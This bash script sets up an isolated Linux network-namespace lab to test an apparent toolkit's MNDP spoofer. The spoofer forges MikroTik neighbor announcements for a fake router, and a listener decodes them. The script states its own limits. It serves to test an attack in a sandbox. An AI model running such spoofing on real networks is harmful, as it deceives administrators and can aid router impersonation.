#!/usr/bin/env bash
# Isolated MNDP spoofing lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with two hosts attached:
#
#   receiver: a host that listens on UDP port 5678 for MikroTik Neighbor Discovery
#             announcements and decodes them with MACabre's parser. It stands in for a
#             RouterOS device's neighbor list, which is not available on Linux.
#   attacker: MACabre's MNDP spoofer. It announces a router named MACabre-RTR on ether1,
#             with management address 10.99.0.9, RouterOS 7.16 on RB750Gr3.
#
# What this lab shows: the announcement reaches a host on the segment, and the fields
# decode to the values the operator chose. It does not show that a RouterOS device adds
# the announcement to its neighbor list. The MNDP field layout is from a third-party
# description and must be checked against a RouterOS capture before this attack is
# marked as tested.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/mndp_spoofing_lab.sh
#   sudo ADVERTISEMENTS=5 scripts/lab/mndp_spoofing_lab.sh
#
# Requirements: iproute2 and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ADVERTISEMENTS="${ADVERTISEMENTS:-3}"
WORK="$(mktemp -d)"
chmod 755 "$WORK"
FORGED_NAME="MACabre-RTR"
FORGED_ADDR="10.99.0.9"
LISTEN_SECONDS=12

stop_lab() {
    for ns in attacker receiver lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add receiver
ip netns add attacker

for pair in "rcv:receiver" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in rcv att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done
ip netns exec receiver ip link set h-rcv up
ip netns exec attacker ip link set h-att up

LISTEN_CODE='
import os, threading
from scapy.all import AsyncSniffer, UDP
from macabre.attacks.mndp_spoofing import parse_mndp, TLV_MAC, TLV_IDENTITY, TLV_VERSION, TLV_BOARD, TLV_INTERFACE_NAME, TLV_IPV4
seen = []
def on_packet(pkt):
    if pkt.haslayer(UDP) and pkt[UDP].dport == 5678:
        try:
            fields = parse_mndp(bytes(pkt[UDP].payload))
        except ValueError:
            fields = None
        seen.append(fields)
sniffer = AsyncSniffer(iface="h-rcv", store=False, prn=on_packet)
sniffer.start()
threading.Event().wait(float(os.environ["LISTEN_SECONDS"]))
sniffer.stop()
decoded = [f for f in seen if f]
print(f"Receiver: heard {len(seen)} MNDP announcements on UDP 5678, decoded {len(decoded)}")
if decoded:
    last = decoded[-1]
    mac = ":".join(f"{b:02x}" for b in last[TLV_MAC])
    print(f"Receiver: identity {last[TLV_IDENTITY].decode()}, version {last[TLV_VERSION].decode()}, board {last[TLV_BOARD].decode()}")
    print(f"Receiver: MAC {mac}, interface {last[TLV_INTERFACE_NAME].decode()}, address {".".join(str(b) for b in last[TLV_IPV4])}")
'

ATTACK_CODE='
import os, threading
from macabre.attacks.mndp_spoofing import MndpSpoofingConfig, run_mndp_spoofing
stats = run_mndp_spoofing(
    MndpSpoofingConfig(
        iface="h-att",
        identity=os.environ["FORGED_NAME"],
        address=os.environ["FORGED_ADDR"],
        interface_name="ether1",
        count=int(os.environ["ADVERTISEMENTS"]),
        interval=1.0,
    ),
    threading.Event(),
    lambda _: None,
)
print(f"Spoofer: sent {stats.frames} MNDP announcements for {os.environ["FORGED_NAME"]}")
'

echo "Receiver listening for ${LISTEN_SECONDS}s, attacker announces $FORGED_NAME"
ip netns exec receiver env PYTHONPATH="$ROOT/src" LISTEN_SECONDS="$LISTEN_SECONDS" "$PY" -c "$LISTEN_CODE" > "$WORK/receiver.txt" 2>/dev/null &
RECV_PID=$!
sleep 3
ip netns exec attacker env PYTHONPATH="$ROOT/src" FORGED_NAME="$FORGED_NAME" FORGED_ADDR="$FORGED_ADDR" \
    ADVERTISEMENTS="$ADVERTISEMENTS" "$PY" -c "$ATTACK_CODE"
wait "$RECV_PID"
cat "$WORK/receiver.txt"
echo

if grep -q "identity $FORGED_NAME" "$WORK/receiver.txt" && grep -q "address $FORGED_ADDR\|$FORGED_ADDR" "$WORK/receiver.txt"; then
    echo "Result: the announcement reached the receiver and decoded to the forged identity and address. Not yet tested against a RouterOS neighbor list."
else
    echo "Result: the receiver did not decode the forged announcement. Result unreliable."
fi
